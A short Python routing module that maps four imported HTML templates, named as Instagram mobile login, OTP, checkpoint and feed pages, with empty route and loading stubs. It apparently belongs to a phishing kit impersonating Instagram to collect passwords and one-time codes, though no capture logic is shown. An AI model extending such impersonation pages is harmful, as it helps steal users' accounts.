"""route.py - Routes et templates Instagram."""

from platforms.instagram.login import HTML_MOBILE_LOGIN
from platforms.instagram.otp import HTML_OTP_MOBILE
from platforms.instagram.checkpoint import HTML_CHECKPOINT
from platforms.instagram.feed import HTML_FEED

TEMPLATES = {
    "mobile_login": HTML_MOBILE_LOGIN,
    "mobile_otp": HTML_OTP_MOBILE,
    "checkpoint": HTML_CHECKPOINT,
    "feed": HTML_FEED,
}

def get_template(key):
    return TEMPLATES.get(key)

def handle_loading(cfg):
    return None

def register_routes(app):
    pass
